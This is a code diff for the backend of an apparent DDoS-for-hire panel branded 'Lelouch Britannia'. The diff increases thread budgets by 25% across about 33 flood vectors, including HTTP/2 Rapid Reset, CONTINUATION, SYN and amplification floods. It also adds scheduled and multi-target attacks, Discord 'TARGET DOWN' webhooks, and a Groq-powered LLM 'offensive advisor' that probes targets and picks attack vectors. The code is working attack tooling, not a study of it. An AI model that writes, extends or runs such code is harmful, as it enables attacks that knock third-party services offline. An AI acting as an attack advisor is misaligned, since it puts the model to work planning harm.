@@ -102,15 +102,132 @@ setInterval(() => {
 const CPU_COUNT = Math.max(1, os.cpus().length);
 
 // ── Webhook ────────────────────────────────────────────────────────────────
-async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
+async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
   try {
+    const payload = {
+      event,
+      attack,
+      timestamp: new Date().toISOString(),
+      embeds: [{
+        title: event === "target_down" ? "🔴 TARGET DOWN — LELOUCH BRITANNIA" : "✅ ATTACK FINISHED — LELOUCH BRITANNIA",
+        description: event === "target_down"
+          ? `Target **${attack.target}** confirmed OFFLINE`
+          : `Attack against **${attack.target}** has completed`,
+        color: event === "target_down" ? 0xFF0000 : 0x00FF41,
+        fields: [
+          { name: "Target",       value: attack.target,              inline: true },
+          { name: "Method",       value: attack.method,              inline: true },
+          { name: "Duration",     value: `${attack.duration}s`,      inline: true },
+          { name: "Packets Sent", value: String(attack.packetsSent), inline: true },
+          { name: "Bytes Sent",   value: String(attack.bytesSent),   inline: true },
+          { name: "Status",       value: attack.status,              inline: true },
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Lelouch Britannia — ARES OMNIVECT ∞" },
+      }],
+    };
     await fetch(url, {
       method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ event: "attack_finished", attack }),
+      body: JSON.stringify(payload),
       signal: AbortSignal.timeout(5000),
     });
   } catch { /* silent */ }
 }
+
+// ── Kill webhook: fire when target confirmed down (called from panel /api/notify) ──
+// ── Scheduled attacks — in-memory queue with 10s polling ──────────────────
+interface ScheduledAttack {
+  id: string; target: string; port: number; method: string;
+  duration: number; threads: number; webhookUrl?: string;
+  scheduledFor: number; createdAt: number;
+}
+const scheduledAttacks = new Map<string, ScheduledAttack>();
+
+// Poll every 10s — fire scheduled attacks that are due
+setInterval(async () => {
+  const now = Date.now();
+  for (const [sid, sa] of scheduledAttacks.entries()) {
+    if (now >= sa.scheduledFor) {
+      scheduledAttacks.delete(sid);
+      try {
+        await fetch(`http://127.0.0.1:${process.env.PORT ?? 8080}/api/attacks`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            target: sa.target, port: sa.port, method: sa.method,
+            duration: sa.duration, threads: sa.threads, webhookUrl: sa.webhookUrl,
+          }),
+          signal: AbortSignal.timeout(8000),
+        });
+      } catch { /* ignore — server may be starting */ }
+    }
+  }
+}, 10_000);
+
+// ── AI Advisor — live Groq-powered tactical analysis ──────────────────────
+const GROQ_SYSTEM = `You are an elite offensive security AI advisor for a penetration testing platform called "Lelouch Britannia". Analyze live attack metrics and return ONLY a valid JSON object. No markdown, no explanation.`;
+async function groqAdvisor(attack: typeof attacksTable.$inferSelect, pps: number, bps: number, conns: number, targetStatus: string, targetLatencyMs: number): Promise<Record<string, unknown>> {
+  const apiKey = process.env.GROQ_API_KEY;
+  if (!apiKey) return { error: "GROQ_API_KEY not set" };
+  const msg = `LIVE METRICS — Target:${attack.target} Method:${attack.method} PPS:${pps} BPS:${bps} Conns:${conns} HTTP:${targetStatus} Latency:${targetLatencyMs}ms
+
+Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read
+
+Respond with JSON: {"analysis":"brief tactical assessment","primaryRecommendation":"specific next action","boostVector":"method_name","reduceVector":"method_name or null","severity":"low|medium|high|critical","estimatedDownIn":"time estimate or null","tip":"one advanced tip","effectiveness":0-100}`;
+  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
+    body: JSON.stringify({
+      model: "llama-3.3-70b-versatile",
+      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
+      max_tokens: 400, temperature: 0.2,
+      response_format: { type: "json_object" },
+    }),
+    signal: AbortSignal.timeout(15_000),
+  });
+  const data = await resp.json() as { choices?: [{ message?: { content?: string } }] };
+  return JSON.parse(data?.choices?.[0]?.message?.content ?? "{}");
+}
+
+// ── Standalone AI Advisor (no attack required) — probe + analyse ──────────
+async function groqAdvisorTarget(target: string): Promise<Record<string, unknown>> {
+  const apiKey = process.env.GROQ_API_KEY;
+  if (!apiKey) return { error: "GROQ_API_KEY not set" };
+  // Quick probe
+  let targetStatus = "unknown"; let targetLatencyMs = 0;
+  try {
+    const t0 = Date.now();
+    const url = target.startsWith("http") ? target : `https://${target}/`;
+    const pr = await fetch(url, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
+    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
+  } catch { targetStatus = "offline"; }
+  const msg = `PRE-ATTACK RECON — Target:${target} HTTP:${targetStatus} Latency:${targetLatencyMs}ms
+Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read
+Respond with JSON: {"analysis":"brief target assessment","primaryRecommendation":"best starting vector","boostVector":"method_name","severity":"low|medium|high|critical","estimatedDownIn":"rough estimate","tip":"one advanced tip","effectiveness":0-100,"targetStatus":"${targetStatus}","latencyMs":${targetLatencyMs}}`;
+  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
+    body: JSON.stringify({
+      model: "llama-3.3-70b-versatile",
+      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
+      max_tokens: 400, temperature: 0.2,
+      response_format: { type: "json_object" },
+    }),
+    signal: AbortSignal.timeout(15_000),
+  });
+  const data = await resp.json() as { choices?: [{ message?: { content?: string } }] };
+  return JSON.parse(data?.choices?.[0]?.message?.content ?? "{}");
+}
+
+// GET /api/advisor?target=<url>  — standalone AI advisory (no active attack needed)
+router.get("/advisor", async (req, res): Promise<void> => {
+  const target = String(req.query.target ?? "").trim();
+  if (!target) { res.status(400).json({ error: "target query param required" }); return; }
+  try {
+    const advice = await groqAdvisorTarget(target);
+    res.json(advice);
+  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
+});
 
 // ── DB stats accumulator ──────────────────────────────────────────────────
 async function addStats(id: number, pkts: number, bytes: number) {
@@ -307,41 +424,41 @@ async function runAttackWorkers(
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
 
-    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (33-vector) ──
-    const connT    = Math.max(400,  Math.round(threads * 0.08));
-    const slowT    = Math.max(400,  Math.round(threads * 0.08));
-    const h2T      = Math.max(6000, Math.round(threads * 0.50)); // ★★★ CVE-2023-44487 (was 3000/0.32)
-    const contT    = Math.max(4000, Math.round(threads * 0.36)); // ★★★ CVE-2024-27316 OOM (was 2000/0.24)
-    const hpackT   = Math.max(2500, Math.round(threads * 0.28)); // ★★ HPACK storm (was 1200/0.18)
-    const wafT     = Math.max(2000, Math.round(threads * 0.28)); // ★★ Chrome WAF bypass (was 1200/0.20)
-    const wsT      = Math.max(300,  Math.round(threads * 0.08));
-    const gqlT     = Math.max(200,  Math.round(threads * 0.06));
-    const udpT     = Math.max(256,  Math.round(threads * 0.06));
-    const rudyT    = Math.max(240,  Math.round(threads * 0.07));
-    const cacheT   = Math.max(200,  Math.round(threads * 0.06));
-    const tlsT     = Math.max(200,  Math.round(threads * 0.06));
-    const quicT    = Math.max(128,  Math.round(threads * 0.04));
-    const sslT     = Math.max(400,  Math.round(threads * 0.08)); // ★ SSL Death Record (was 200)
-    const stormT   = Math.max(3000, Math.round(threads * 0.40)); // ★★★ H2 Settings Storm (was 1500/0.26)
-    const pipeT    = Math.max(10000,Math.round(threads * 0.60)); // ★★★ HTTP Pipeline (was 5000/0.40)
-    const bypassT  = Math.max(1000, Math.round(threads * 0.18)); // ★ Chrome bypass (was 500)
-    const kaT      = Math.max(600,  Math.round(threads * 0.12)); // [NEW] Keepalive exhaust
-    const pingT    = Math.max(1500, Math.round(threads * 0.22)); // [NEW] H2 PING storm (was 800/0.15)
-    const smugT    = Math.max(300,  Math.round(threads * 0.08)); // [NEW] HTTP smuggling
-    const xmlT     = Math.max(200,  Math.round(threads * 0.05)); // [NEW] XML bomb
-    const slowRT   = Math.max(400,  Math.round(threads * 0.07)); // [NEW] Slow Read
-    const rangeT   = Math.max(600,  Math.round(threads * 0.10)); // [NEW] Range flood
-    const synT     = Math.max(2048, Math.round(threads * 0.12)); // ★ SYN flood (was 1024)
+    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (33-vector) — v3 +25% ──
+    const connT    = Math.max(500,  Math.round(threads * 0.10)); // +25% conn flood
+    const slowT    = Math.max(500,  Math.round(threads * 0.10)); // +25% slowloris
+    const h2T      = Math.max(7500, Math.round(threads * 0.62)); // ★★★ CVE-2023-44487 +25%
+    const contT    = Math.max(5000, Math.round(threads * 0.45)); // ★★★ CVE-2024-27316 +25%
+    const hpackT   = Math.max(3200, Math.round(threads * 0.35)); // ★★ HPACK storm +25%
+    const wafT     = Math.max(2500, Math.round(threads * 0.35)); // ★★ Chrome WAF bypass +25%
+    const wsT      = Math.max(400,  Math.round(threads * 0.10)); // +25% WS flood
+    const gqlT     = Math.max(250,  Math.round(threads * 0.07)); // +25% GraphQL
+    const udpT     = Math.max(320,  Math.round(threads * 0.08)); // +25% UDP
+    const rudyT    = Math.max(300,  Math.round(threads * 0.09)); // +25% RUDY
+    const cacheT   = Math.max(250,  Math.round(threads * 0.07)); // +25% cache poison
+    const tlsT     = Math.max(250,  Math.round(threads * 0.07)); // +25% TLS renego
+    const quicT    = Math.max(160,  Math.round(threads * 0.05)); // +25% QUIC
+    const sslT     = Math.max(500,  Math.round(threads * 0.10)); // ★ SSL Death Record +25%
+    const stormT   = Math.max(3750, Math.round(threads * 0.50)); // ★★★ H2 Settings Storm +25%
+    const pipeT    = Math.max(12500,Math.round(threads * 0.75)); // ★★★ HTTP Pipeline +25%
+    const bypassT  = Math.max(1250, Math.round(threads * 0.22)); // ★ Chrome bypass +25%
+    const kaT      = Math.max(750,  Math.round(threads * 0.15)); // Keepalive exhaust +25%
+    const pingT    = Math.max(1900, Math.round(threads * 0.28)); // H2 PING storm +25%
+    const smugT    = Math.max(400,  Math.round(threads * 0.10)); // HTTP smuggling +25%
+    const xmlT     = Math.max(250,  Math.round(threads * 0.06)); // XML bomb +25%
+    const slowRT   = Math.max(500,  Math.round(threads * 0.09)); // Slow Read +25%
+    const rangeT   = Math.max(750,  Math.round(threads * 0.12)); // Range flood +25%
+    const synT     = Math.max(2560, Math.round(threads * 0.15)); // ★ SYN flood +25%
     // L3/UDP — each gets its own thread pool
-    const icmpT    = Math.max(2048, Math.round(threads * 0.12)); // ICMP: 2048 sockets (was 1024)
-    const dnsT     = Math.max(2048, Math.round(threads * 0.08)); // DNS Water Torture (was 1024)
-    const ntpT     = Math.max(2048, Math.round(threads * 0.07)); // NTP mode 7 monlist (was 1024)
-    const memT     = Math.max(1024, Math.round(threads * 0.06)); // Memcached (was 512)
-    const ssdpT    = Math.max(1024, Math.round(threads * 0.06)); // SSDP M-SEARCH (was 512)
-    const dohT     = Math.max(300,  Math.round(threads * 0.05)); // [NEW] DoH flood
-    const appT     = Math.max(2000, Math.round(threads * 0.24)); // ★★ App Smart Flood (was 800/0.16)
-    const lhbT     = Math.max(1500, Math.round(threads * 0.18)); // ★★ Large Header Bomb (was 600/0.12)
-    const prioT    = Math.max(1200, Math.round(threads * 0.20)); // ★★ H2 PRIORITY Storm (was 600/0.14)
+    const icmpT    = Math.max(2560, Math.round(threads * 0.15)); // ICMP +25%
+    const dnsT     = Math.max(2560, Math.round(threads * 0.10)); // DNS Water Torture +25%
+    const ntpT     = Math.max(2560, Math.round(threads * 0.09)); // NTP mode 7 +25%
+    const memT     = Math.max(1280, Math.round(threads * 0.07)); // Memcached +25%
+    const ssdpT    = Math.max(1280, Math.round(threads * 0.07)); // SSDP M-SEARCH +25%
+    const dohT     = Math.max(400,  Math.round(threads * 0.06)); // DoH flood +25%
+    const appT     = Math.max(2500, Math.round(threads * 0.30)); // ★★ App Smart Flood +25%
+    const lhbT     = Math.max(1875, Math.round(threads * 0.22)); // ★★ Large Header Bomb +25%
+    const prioT    = Math.max(1500, Math.round(threads * 0.25)); // ★★ H2 PRIORITY Storm +25%
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -416,32 +533,37 @@ async function runAttackWorkers(
           : burstAbort.signal;
 
         if (wave % 3 === 0) {
-          // Max spike wave — all top vectors at 2.0× (every 3rd wave)
+          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave) — v3 +25%
           void Promise.all([
-            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
-            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
-            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
-            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.0), Math.min(appW, 8),   combined, onStats),
-            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.0), Math.min(lhbW, 8),  combined, onStats),
-            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
+            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.5), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.5), Math.min(pipeW, 8),  combined, onStats),
+            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.5), Math.min(stormW, 8), combined, onStats),
+            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.5), Math.min(appW, 8),   combined, onStats),
+            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.5), Math.min(lhbW, 8),  combined, onStats),
+            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.5), Math.min(pingW, 4),  combined, onStats),
+            spawnPool("waf-bypass",         target, port, Math.round(wafT   * 2.0), Math.min(wafW, 4),   combined, onStats),
+            spawnPool("hpack-bomb",         target, port, Math.round(hpackT * 2.0), Math.min(hpackW, 4), combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         } else if (wave % 2 === 0) {
-          // App-layer heavy wave — DB query exhaustion burst (even waves)
+          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2× — was 1.8×)
           void Promise.all([
-            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 1.8), Math.min(appW, 8),  combined, onStats),
-            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 1.8), Math.min(lhbW, 8), combined, onStats),
-            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 1.8), Math.min(prioW, 6), combined, onStats),
-            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 1.8), Math.min(kaW, 4),   combined, onStats),
-            spawnPool("http-smuggling",       target, port, Math.round(smugT * 1.8), Math.min(smugW, 4), combined, onStats),
+            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 2.2), Math.min(appW, 8),  combined, onStats),
+            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 2.2), Math.min(lhbW, 8), combined, onStats),
+            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 2.2), Math.min(prioW, 6), combined, onStats),
+            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 2.2), Math.min(kaW, 4),   combined, onStats),
+            spawnPool("http-smuggling",       target, port, Math.round(smugT * 2.2), Math.min(smugW, 4), combined, onStats),
+            spawnPool("tls-renego",           target, port, Math.round(tlsT  * 2.0), Math.min(tlsW, 4),  combined, onStats),
+            spawnPool("ssl-death",            target, port, Math.round(sslT  * 2.0), Math.min(sslW, 4),  combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         } else {
-          // H2/Protocol heavy wave — bandwidth + H2 state exhaustion (odd waves)
+          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0× — was 1.6×)
           void Promise.all([
-            spawnPool("http2-flood",       target, port, Math.round(h2T    * 1.6), Math.min(h2W, 8),    combined, onStats),
-            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 1.6), Math.min(pipeW, 8),  combined, onStats),
-            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 1.6), Math.min(stormW, 8), combined, onStats),
-            spawnPool("http2-continuation",target, port, Math.round(contT  * 1.6), Math.min(contW, 8),  combined, onStats),
-            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 1.6), Math.min(pingW, 4),  combined, onStats),
+            spawnPool("http2-flood",       target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
+            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
+            spawnPool("http2-continuation",target, port, Math.round(contT  * 2.0), Math.min(contW, 8),  combined, onStats),
+            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
+            spawnPool("http2-priority-storm",target,port, Math.round(prioT * 1.8), Math.min(prioW, 4),  combined, onStats),
           ]).finally(() => clearTimeout(burstTimer));
         }
         // 15s rest between waves
@@ -536,6 +658,11 @@ router.post("/attacks", async (req, res): Promise<void> => {
 // Map for abort controllers + stop timers (for Extend support)
 const attackAborts  = new Map<number, AbortController>();
 const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();
+
+// ── Scheduled attacks (GET must be BEFORE /attacks/:id to avoid conflict) ──
+router.get("/attacks/scheduled", (_req, res): void => {
+  res.json([...scheduledAttacks.values()]);
+});
 
 router.get("/attacks/stats", async (_req, res): Promise<void> => {
   // Run all 3 queries in parallel — no full table scan in JS
@@ -635,8 +762,151 @@ router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
     .set({ status: "stopped", stoppedAt: new Date() })
     .where(eq(attacksTable.id, p.data.id)).returning();
   if (!a) { res.status(404).json({ error: "Not found" }); return; }
-  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
+  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a, "attack_stopped");
   res.json({ ok: true, ...a });
+});
+
+// ── AI Advisor — Groq-powered live attack analysis ─────────────────────────
+router.get("/attacks/:id/ai-advisor", async (req, res): Promise<void> => {
+  const id = parseInt(req.params.id, 10);
+  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
+  const [attack] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
+  if (!attack) { res.status(404).json({ error: "Not found" }); return; }
+  const pps   = livePps.get(id)     ?? 0;
+  const bps   = liveBps.get(id)     ?? 0;
+  const conns = attackLiveConns.get(id) ?? 0;
+  // Quick target probe
+  let targetStatus = "unknown"; let targetLatencyMs = 0;
+  try {
+    const t0 = Date.now();
+    const pr = await fetch(`https://${attack.target}/`, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
+    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
+  } catch { targetStatus = "offline"; }
+  try {
+    const advice = await groqAdvisor(attack, pps, bps, conns, targetStatus, targetLatencyMs);
+    res.json({ ...advice, metrics: { pps, bps, conns, targetStatus, targetLatencyMs, running: attackAborts.has(id) } });
+  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
+});
+
+// ── Scheduled attacks ──────────────────────────────────────────────────────
+router.post("/attacks/schedule", (req, res): void => {
+  const { target, port, method, duration, threads, scheduledFor, webhookUrl } = req.body as Record<string, unknown>;
+  if (!target || !port || !method || !duration || !threads || !scheduledFor) {
+    res.status(400).json({ error: "Missing: target, port, method, duration, threads, scheduledFor" }); return;
+  }
+  const fireAt = new Date(scheduledFor as string).getTime();
+  if (isNaN(fireAt) || fireAt <= Date.now()) {
+    res.status(400).json({ error: "scheduledFor must be a future ISO timestamp" }); return;
+  }
+  const sid = `sched_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+  const sa: ScheduledAttack = {
+    id: sid, target: String(target), port: Number(port),
+    method: String(method), duration: Number(duration), threads: Number(threads),
+    webhookUrl: webhookUrl ? String(webhookUrl) : undefined,
+    scheduledFor: fireAt, createdAt: Date.now(),
+  };
+  scheduledAttacks.set(sid, sa);
+  res.status(201).json(sa);
+});
+
+router.delete("/attacks/scheduled/:sid", (req, res): void => {
+  const { sid } = req.params;
+  if (!scheduledAttacks.has(sid)) { res.status(404).json({ error: "Scheduled attack not found" }); return; }
+  scheduledAttacks.delete(sid);
+  res.json({ ok: true, deleted: sid });
+});
+
+// ── Multi-target simultaneous attack ──────────────────────────────────────
+router.post("/attacks/multi", async (req, res): Promise<void> => {
+  const { targets, port, method, duration, threads, webhookUrl } = req.body as {
+    targets: string[]; port?: number; method?: string; duration?: number; threads?: number; webhookUrl?: string;
+  };
+  if (!Array.isArray(targets) || targets.length === 0) {
+    res.status(400).json({ error: "targets must be a non-empty array" }); return;
+  }
+  if (targets.length > 5) { res.status(400).json({ error: "Maximum 5 simultaneous targets" }); return; }
+  const results: (typeof attacksTable.$inferSelect)[] = [];
+  for (const tgt of targets) {
+    const [atk] = await db.insert(attacksTable).values({
+      target: tgt, port: port ?? 443, method: method ?? "geass-override",
+      duration: duration ?? 60, threads: threads ?? 1000,
+      status: "running", packetsSent: 0, bytesSent: 0,
+      webhookUrl: webhookUrl ?? null,
+    }).returning();
+    const aid = atk.id;
+    const ctrl = new AbortController();
+    const endMs = Date.now() + (duration ?? 60) * 1000;
+    attackAborts.set(aid, ctrl);
+    attackTimers.set(aid, setTimeout(() => ctrl.abort("duration_expired"), (duration ?? 60) * 1000));
+    attackEndTimes.set(aid, endMs);
+    livePackets.set(aid, 0); liveBytes.set(aid, 0);
+    livePps.set(aid, 0);     liveBps.set(aid, 0);
+    prevPktsSnap.set(aid, 0); prevBytesSnap.set(aid, 0);
+    if ((method ?? "geass-override") === "geass-override") fanOutToCluster(tgt, port ?? 443, "geass-override", duration ?? 60, threads ?? 1000);
+    void runAttackWorkers(method ?? "geass-override", tgt, port ?? 443, threads ?? 1000, ctrl.signal,
+      (pkts, bytes, conns) => onWorkerStats(aid, pkts, bytes, conns)
+    ).finally(async () => {
+      const pp = dbBatchPkts.get(aid) ?? 0; const bb = dbBatchBytes.get(aid) ?? 0;
+      dbBatchPkts.delete(aid); dbBatchBytes.delete(aid);
+      if (pp > 0 || bb > 0) void addStats(aid, pp, bb);
+      attackLiveConns.delete(aid); livePackets.delete(aid); liveBytes.delete(aid);
+      livePps.delete(aid);         liveBps.delete(aid);
+      prevPktsSnap.delete(aid);    prevBytesSnap.delete(aid);
+      const t = attackTimers.get(aid); if (t) clearTimeout(t);
+      attackTimers.delete(aid); attackAborts.delete(aid); attackEndTimes.delete(aid);
+      try {
+        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, aid));
+        if (cur?.status === "running") {
+          const [fin] = await db.update(attacksTable).set({ status: "finished", stoppedAt: new Date() })
+            .where(eq(attacksTable.id, aid)).returning();
+          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
+        }
+      } catch { /* ignore */ }
+    });
+    results.push(atk);
+  }
+  res.status(201).json({ attacks: results, count: results.length });
+});
+
+// ── Kill Webhook notify — fire Discord/custom webhook with attack kill confirmation ──
+router.post("/notify", async (req, res): Promise<void> => {
+  const { webhookUrl, attackId, event, message } = req.body as Record<string, string>;
+  if (!webhookUrl) { res.status(400).json({ error: "webhookUrl is required" }); return; }
+  let attackData: typeof attacksTable.$inferSelect | null = null;
+  if (attackId) {
+    try {
+      const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, parseInt(attackId, 10)));
+      attackData = a ?? null;
+    } catch { /* ignore */ }
+  }
+  const evt = event ?? "target_down";
+  const desc = message ?? (attackData ? `Target **${attackData.target}** confirmed OFFLINE` : "Target confirmed OFFLINE");
+  const payload = {
+    username: "Lelouch Britannia",
+    avatar_url: "https://i.imgur.com/ZHKmhI7.png",
+    embeds: [{
+      title: evt === "target_down" ? "🔴 TARGET DOWN — GEASS CONFIRMED" : "⚔️ LELOUCH BRITANNIA — ATTACK EVENT",
+      description: desc,
+      color: evt === "target_down" ? 0xFF0000 : 0xFF6600,
+      fields: attackData ? [
+        { name: "🎯 Target",       value: `\`${attackData.target}\``,  inline: true },
+        { name: "⚔️ Method",       value: `\`${attackData.method}\``,  inline: true },
+        { name: "⏱ Duration",      value: `${attackData.duration}s`,   inline: true },
+        { name: "📦 Packets Sent",  value: (livePackets.get(attackData.id) ?? attackData.packetsSent).toLocaleString(), inline: true },
+        { name: "📊 PPS at Kill",   value: (livePps.get(attackData.id) ?? 0).toLocaleString(),                          inline: true },
+        { name: "🔌 Status",        value: attackData.status,           inline: true },
+      ] : [{ name: "Event", value: evt, inline: true }],
+      timestamp: new Date().toISOString(),
+      footer: { text: "Lelouch Britannia • ARES OMNIVECT ∞ v3" },
+    }],
+  };
+  try {
+    const r = await fetch(webhookUrl, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload), signal: AbortSignal.timeout(6000),
+    });
+    res.json({ ok: true, status: r.status });
+  } catch (e) { res.status(503).json({ error: "Webhook delivery failed", detail: String(e) }); }
 });
 
 export default router;
